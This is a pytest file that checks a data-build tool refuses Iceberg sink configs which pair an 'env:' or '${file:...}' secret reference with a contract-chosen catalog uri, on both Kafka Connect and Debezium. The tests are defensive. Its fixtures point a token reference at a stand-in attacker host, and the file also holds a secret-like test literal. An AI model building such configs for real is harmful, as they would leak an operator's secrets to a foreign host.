# Copyright 2025 Agentics Transformation Limited
# SPDX-License-Identifier: Apache-2.0

"""An ``env:`` reference in an Iceberg sink override map, without ``sink.catalogAuth``.

Apache Iceberg's REST catalog replaces any property value that starts with
``env:`` by that variable of the process that runs the sink, and the catalog
``uri`` sits in the same map. A contract that writes ``token: env:NAME`` and
picks the ``uri`` would send the operator's variable to a host the contract
chose. ``sink.catalogAuth`` is the one place a variable is named, because the
operator pairs it with the hosts it reaches, so every override map is refused
a reference unless it is paired there, on both engines, in ``fluid validate``
and at run time.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any, Dict, List, Optional

import pytest

from fluid_build.build_runners.kafka_connect.iceberg_sink_validation import (
    iceberg_sink_plan,
    iceberg_sink_preflight,
    unplanned_sink_reference_errors,
    validate_iceberg_sink,
)

# The shared fixtures and contract builders of the paired-auth tests: the
# autouse fixture pairs the fixture variables with the fixture hosts.
from tests.build_runners.test_catalog_auth_sink import (  # noqa: F401
    _BEARER,
    _dbz_contract,
    _kc_contract,
    _operator_allows_the_fixture_hosts,
    _props_path,
    fake_server,
)

pytestmark = [pytest.mark.unit]

_VARIABLE = "OPERATOR_SYNTH_SECRET"
_ATTACKER = "https://catalog.attacker.example/catalog"


def _kc_override(**extra: Any) -> Dict[str, Any]:
    return {
        "iceberg.catalog.token": f"env:{_VARIABLE}",
        "iceberg.catalog.uri": _ATTACKER,
        **extra,
    }


def _dbz_config(**extra: Any) -> Dict[str, Any]:
    return {"token": f"env:{_VARIABLE}", "uri": _ATTACKER, **extra}


def _errors(contract: Dict[str, Any]) -> List[str]:
    errors, _warnings = validate_iceberg_sink(contract)
    return errors


def _unpaired(errors: List[str]) -> List[str]:
    return [e for e in errors if "starts with env:" in e]


# ── Kafka Connect ───────────────────────────────────────────────────────────


def test_kafka_connect_run_refuses_an_unpaired_override_and_pushes_nothing(
    kafka_connect_mock, tmp_path: Path, monkeypatch
):
    from fluid_build.build_runners.kafka_connect.runner import execute_kafka_connect_build

    monkeypatch.setenv(_VARIABLE, "operator-value")
    contract = _kc_contract(None, iceberg_catalog_overrides=_kc_override())
    assert execute_kafka_connect_build(contract["builds"][0], contract, tmp_path) == 1
    assert kafka_connect_mock.calls == []
    assert kafka_connect_mock.connectors == {}


def test_kafka_connect_run_refuses_an_unpaired_hand_written_sink_config(
    kafka_connect_mock, tmp_path: Path
):
    from fluid_build.build_runners.kafka_connect.runner import execute_kafka_connect_build

    contract = _kc_contract(None, sink_connector_config=_kc_override())
    assert execute_kafka_connect_build(contract["builds"][0], contract, tmp_path) == 1
    assert kafka_connect_mock.calls == []


def test_kafka_connect_validate_names_catalog_auth_and_never_the_variable():
    contract = _kc_contract(None, iceberg_catalog_overrides=_kc_override())
    problems = _unpaired(_errors(contract))
    # The token and the uri are both overrides; only the token names a variable.
    assert len(problems) == 1
    assert "iceberg_catalog_overrides iceberg.catalog.token" in problems[0]
    assert "sink.catalogAuth" in problems[0]
    assert _VARIABLE not in problems[0]


@pytest.mark.parametrize("key", ["iceberg.catalog.uri", "iceberg.catalog.header.X-Org"])
def test_kafka_connect_refuses_a_reference_in_any_key_iceberg_reads(key):
    contract = _kc_contract(None, iceberg_catalog_overrides={key: f"env:{_VARIABLE}"})
    assert len(_unpaired(_errors(contract))) == 1


@pytest.mark.parametrize("value", [f"env:{_VARIABLE}", f"  env:{_VARIABLE}", "${file:/etc/x:y}"])
def test_kafka_connect_refuses_each_reference_spelling(value):
    contract = _kc_contract(None, iceberg_catalog_overrides={"iceberg.catalog.token": value})
    assert len(_unpaired(_errors(contract))) == 1


def test_kafka_connect_leaves_an_expression_in_a_key_iceberg_does_not_read():
    # The worker's Kafka clients keep their config providers: the runner's own
    # expression check still reads the whole config when it is pushed.
    contract = _kc_contract(
        None,
        sink_connector_config={"consumer.override.client.id": "${file:/etc/hostname:x}"},
    )
    assert _unpaired(_errors(contract)) == []


def test_kafka_connect_leaves_an_env_prefix_in_a_key_iceberg_does_not_read():
    # Only Iceberg resolves ``env:``; the worker's Kafka clients do not.
    contract = _kc_contract(
        None, sink_connector_config={"consumer.override.client.id": f"env:{_VARIABLE}"}
    )
    assert _unpaired(_errors(contract)) == []


def test_kafka_connect_plain_values_and_unset_overrides_are_fine():
    contract = _kc_contract(
        None,
        iceberg_catalog_overrides={
            "iceberg.catalog.warehouse": "demo",
            "iceberg.catalog.scope": "an env: value inside the text",
            "iceberg.catalog.uri": None,
        },
    )
    assert _unpaired(_errors(contract)) == []


def test_kafka_connect_paired_through_catalog_auth_still_works(kafka_connect_mock, tmp_path: Path):
    from fluid_build.build_runners.kafka_connect.runner import execute_kafka_connect_build

    contract = _kc_contract(dict(_BEARER))
    assert execute_kafka_connect_build(contract["builds"][0], contract, tmp_path) == 0
    config = kafka_connect_mock.connectors["src-sink"]["config"]
    assert config["iceberg.catalog.token"] == "env:UC_TOKEN"
    assert _unpaired(_errors(contract)) == []


def test_kafka_connect_with_catalog_auth_keeps_its_own_override_error():
    # With sink.catalogAuth the other check reads the maps: one error per key,
    # not two.
    contract = _kc_contract(
        dict(_BEARER),
        iceberg_catalog_overrides={"iceberg.catalog.header.X-Org": f"env:{_VARIABLE}"},
    )
    errors = [e for e in _errors(contract) if "starts with env:" in e]
    assert len(errors) == 1
    assert "UC_TOKEN" in errors[0]


def test_the_preflight_reports_it_without_the_variable():
    contract = _kc_contract(None, iceberg_catalog_overrides=_kc_override())
    message: Optional[str] = iceberg_sink_preflight(contract, "ingest")
    assert message is not None and "starts with env:" in message
    assert _VARIABLE not in message


# ── embedded Debezium Server ────────────────────────────────────────────────


def test_embedded_run_refuses_an_unpaired_hand_written_config_and_starts_nothing(
    tmp_path: Path, monkeypatch, fake_server
):
    from fluid_build.build_runners.debezium.runner import execute_debezium_build

    monkeypatch.setenv(_VARIABLE, "operator-value")
    contract = _dbz_contract(None, {"type": "iceberg", "config": _dbz_config()})
    assert execute_debezium_build(contract["builds"][0], contract, tmp_path) == 1
    assert fake_server.calls == []
    assert not _props_path(contract, tmp_path).exists()


def test_embedded_run_refuses_an_unpaired_override_of_the_derived_config(
    tmp_path: Path, monkeypatch, fake_server
):
    from fluid_build.build_runners.debezium.runner import execute_debezium_build

    monkeypatch.setenv(_VARIABLE, "operator-value")
    contract = _dbz_contract(
        None, {"type": "iceberg", "iceberg_sink_enabled": True, "config": _dbz_config()}
    )
    assert execute_debezium_build(contract["builds"][0], contract, tmp_path) == 1
    assert fake_server.calls == []
    assert not _props_path(contract, tmp_path).exists()


def test_embedded_validate_names_catalog_auth_and_never_the_variable():
    contract = _dbz_contract(None, {"type": "iceberg", "config": _dbz_config()})
    problems = _unpaired(_errors(contract))
    assert len(problems) == 1
    assert "debezium.server.sink.config token" in problems[0]
    assert "sink.catalogAuth" in problems[0]
    assert _VARIABLE not in problems[0]


def test_embedded_paired_through_catalog_auth_still_runs(tmp_path: Path, monkeypatch, fake_server):
    from fluid_build.build_runners.debezium.runner import execute_debezium_build

    monkeypatch.setenv("UC_TOKEN", "operator-value")
    contract = _dbz_contract(dict(_BEARER))
    assert execute_debezium_build(contract["builds"][0], contract, tmp_path) == 0
    assert "debezium.sink.iceberg.token=env:UC_TOKEN" in _props_path(contract, tmp_path).read_text()
    assert len(fake_server.calls) == 1


# ── a hand-written sink config of a build with no Iceberg plan ───────────────


def _without_sink_format(contract: Dict[str, Any]) -> Dict[str, Any]:
    del contract["builds"][0]["properties"]["sink"]
    assert iceberg_sink_plan(contract["builds"][0]) is None
    return contract


def test_embedded_config_without_sink_format_is_read_by_validate():
    contract = _without_sink_format(
        _dbz_contract(None, {"type": "iceberg", "config": _dbz_config()})
    )
    problems = _unpaired(_errors(contract))
    assert len(problems) == 1 and "debezium.server.sink.config token" in problems[0]
    assert _VARIABLE not in problems[0]
    assert unplanned_sink_reference_errors(contract["builds"][0]) == problems


def test_embedded_run_refuses_a_config_without_sink_format_and_starts_nothing(
    tmp_path: Path, monkeypatch, fake_server
):
    from fluid_build.build_runners.debezium.runner import execute_debezium_build

    monkeypatch.setenv(_VARIABLE, "operator-value")
    contract = _without_sink_format(
        _dbz_contract(None, {"type": "iceberg", "config": _dbz_config()})
    )
    assert execute_debezium_build(contract["builds"][0], contract, tmp_path) == 1
    assert fake_server.calls == []
    assert not _props_path(contract, tmp_path).exists()


@pytest.mark.parametrize("catalog_auth", [{}, False, {"type": "bearer"}])
def test_a_catalog_auth_on_a_build_without_a_plan_does_not_switch_the_scan_off(catalog_auth):
    for contract in (
        _without_sink_format(_dbz_contract(None, {"type": "iceberg", "config": _dbz_config()})),
        _without_sink_format(_kc_contract(None, sink_connector_config=_kc_override())),
    ):
        build = contract["builds"][0]
        build["properties"]["sink"] = {"catalogAuth": catalog_auth}
        assert iceberg_sink_plan(build) is None
        assert len(_unpaired(unplanned_sink_reference_errors(build))) == 1


def test_runs_without_a_plan_refuse_it_whatever_catalog_auth_says(
    kafka_connect_mock, tmp_path: Path, monkeypatch, fake_server
):
    from fluid_build.build_runners.debezium.runner import execute_debezium_build
    from fluid_build.build_runners.kafka_connect.runner import execute_kafka_connect_build

    monkeypatch.setenv(_VARIABLE, "operator-value")
    dbz = _without_sink_format(_dbz_contract(None, {"type": "iceberg", "config": _dbz_config()}))
    dbz["builds"][0]["properties"]["sink"] = {"catalogAuth": {}}
    assert execute_debezium_build(dbz["builds"][0], dbz, tmp_path) == 1
    assert fake_server.calls == []
    assert not _props_path(dbz, tmp_path).exists()

    kc = _without_sink_format(_kc_contract(None, sink_connector_config=_kc_override()))
    kc["builds"][0]["properties"]["sink"] = {"catalogAuth": {}}
    assert execute_kafka_connect_build(kc["builds"][0], kc, tmp_path) == 1
    assert kafka_connect_mock.calls == []


@pytest.mark.parametrize("plan", [True, False], ids=["planned", "unplanned"])
def test_embedded_run_refuses_a_config_that_is_not_a_mapping(
    tmp_path: Path, monkeypatch, fake_server, plan
):
    from fluid_build.build_runners.debezium.runner import execute_debezium_build

    monkeypatch.setenv(_VARIABLE, "operator-value")
    pairs = [[key, value] for key, value in _dbz_config().items()]
    contract = _dbz_contract(None, {"type": "iceberg", "config": pairs})
    if not plan:
        contract = _without_sink_format(contract)
    assert execute_debezium_build(contract["builds"][0], contract, tmp_path) == 1
    assert fake_server.calls == []
    assert not _props_path(contract, tmp_path).exists()


def test_kafka_connect_config_without_sink_format_is_read_by_validate():
    contract = _without_sink_format(_kc_contract(None, sink_connector_config=_kc_override()))
    assert len(_unpaired(_errors(contract))) == 1


def test_kafka_connect_run_refuses_a_config_without_sink_format_and_pushes_nothing(
    kafka_connect_mock, tmp_path: Path
):
    from fluid_build.build_runners.kafka_connect.runner import execute_kafka_connect_build

    contract = _without_sink_format(_kc_contract(None, sink_connector_config=_kc_override()))
    assert execute_kafka_connect_build(contract["builds"][0], contract, tmp_path) == 1
    assert kafka_connect_mock.calls == []


def test_unplanned_reader_leaves_other_sinks_and_other_keys_alone():
    other = _without_sink_format(
        _dbz_contract(None, {"type": "kafka", "config": {"token": f"env:{_VARIABLE}"}})
    )
    assert unplanned_sink_reference_errors(other["builds"][0]) == []
    foreign = _without_sink_format(
        _kc_contract(None, sink_connector_config={"connector.class": "x", "a": f"env:{_VARIABLE}"})
    )
    assert unplanned_sink_reference_errors(foreign["builds"][0]) == []
    planned = _dbz_contract(None, {"type": "iceberg", "config": _dbz_config()})
    assert unplanned_sink_reference_errors(planned["builds"][0]) == []


# ── the advice ──────────────────────────────────────────────────────────────


@pytest.mark.parametrize("engine", ["kafka-connect", "debezium"])
def test_the_inlined_secret_warning_points_only_to_catalog_auth(engine):
    literal = "spark:2OR3eRvYfSZzzZ16MlPd95jhLnOaLM52"  # pragma: allowlist secret
    if engine == "debezium":
        contract = _dbz_contract(None, {"type": "iceberg", "config": {"credential": literal}})
    else:
        contract = _kc_contract(
            None, iceberg_catalog_overrides={"iceberg.catalog.credential": literal}
        )
    _errors_, warnings = validate_iceberg_sink(contract)
    inlined = [w for w in warnings if "literal value" in w]
    assert len(inlined) == 1
    assert "sink.catalogAuth" in inlined[0]
    assert "env:" not in inlined[0]
    assert literal not in inlined[0]
